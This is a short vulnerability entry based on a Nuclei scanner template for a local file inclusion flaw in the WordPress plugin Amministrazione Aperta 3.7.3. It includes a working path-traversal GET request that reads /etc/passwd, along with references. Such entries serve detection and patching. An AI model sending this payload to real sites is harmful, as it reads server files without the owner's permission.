# Nuclei Template: WordPress Amministrazione Aperta 3.7.3 - Local File Inclusion
**Template ID:** amministrazione-aperta-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`amministrazione-aperta-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Amministrazione Aperta 3.7.3 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/amministrazione-aperta/wpgov/dispatcher.php?open=../../../../../../../../../../etc/passwd
```

## References
- https://www.exploit-db.com/exploits/50838
- https://wordpress.org/plugins/amministrazione-aperta
